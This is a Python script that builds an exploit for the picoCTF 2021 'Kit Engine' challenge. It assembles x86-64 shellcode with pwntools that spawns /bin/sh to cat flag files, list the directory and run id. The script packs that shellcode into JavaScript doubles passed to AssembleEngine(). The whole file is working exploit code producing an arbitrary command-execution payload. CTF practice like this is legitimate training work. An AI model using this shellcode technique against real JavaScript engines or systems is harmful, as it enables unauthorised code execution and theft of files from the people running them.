#!/usr/bin/env python3
"""Kit Engine (picoCTF 2021 / CyLab 168) exploit builder.
Builds a JS file that packs x86-64 shellcode into doubles and calls AssembleEngine().
"""
import struct, sys

from pwn import asm, shellcraft, context

context.clear(arch='amd64', os='linux')

# Robust command: try several flag locations, then list cwd
CMD = "cat flag.txt /flag.txt /flag /home/*/flag.txt 2>/dev/null; ls -la; id"

sc  = asm(shellcraft.pushstr("/bin/sh"))
# build argv on stack: NULL, ptr to "-c", ptr to cmd, ptr to "/bin/sh", NULL
sc += asm(shellcraft.pushstr(CMD, append_null=True))          # rsp -> CMD
sc += asm("mov rbx, rsp")                                      # rbx = &CMD
sc += asm(shellcraft.pushstr("-c", append_null=True))          # rsp -> "-c"
sc += asm("mov rcx, rsp")                                      # rcx = &"-c"
sc += asm(shellcraft.pushstr("/bin/sh"))                       # rsp -> "/bin/sh"
sc += asm("mov rdi, rsp")                                      # rdi = &"/bin/sh"
sc += asm("""
    xor edx, edx
    push rdx
    push rbx
    push rcx
    push rdi
    mov rsi, rsp
    xor edx, edx
    mov eax, 59
    syscall
    mov eax, 60
    xor edi, edi
    syscall
""")
print("shellcode len:", len(sc), file=sys.stderr)
# pad to multiple of 8 with NOPs
while len(sc) % 8 != 0:
    sc += b"\x90"

doubles = []
for i in range(0, len(sc), 8):
    val = struct.unpack("<d", sc[i:i+8])[0]
    doubles.append(repr(val))

js = "let payload = [\n" + ", ".join(doubles) + "\n];\nAssembleEngine(payload);\n"
sys.stdout.write(js)
print("js len:", len(js), file=sys.stderr)
